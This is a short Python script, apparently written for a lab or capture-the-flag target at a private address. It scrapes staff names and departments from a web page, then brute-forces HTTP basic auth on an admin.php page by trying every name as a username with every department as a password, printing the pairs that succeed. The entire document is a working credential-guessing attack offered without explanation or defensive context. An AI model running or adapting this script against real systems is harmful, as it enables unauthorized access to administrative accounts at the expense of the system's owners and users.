import requests
from bs4 import BeautifulSoup as bs


def names(response):
    parser = bs(response, 'html.parser')
    names = parser.find_all('td', id='name')
    list = []

    for name in names:
        list.append(name.text)
    return list

def department(response):
    parser = bs(response, 'html.parser')
    names = parser.find_all('td', id='department')
    list = []

    for name in names:
        list.append(name.text)
    return list

r =requests.get("http://172.16.120.120")
response = r.content

names = sorted(set(names(response)))
dept = sorted(set(department(response))) 

for name in names:
    for dep in dept:
        r = requests.get("http://172.16.120.120/admin.php", auth=(name, dep))
        if str(r.status_code) != '401':
            print("\n Username :" + name)
            print("\n Password :" + dep + "\n")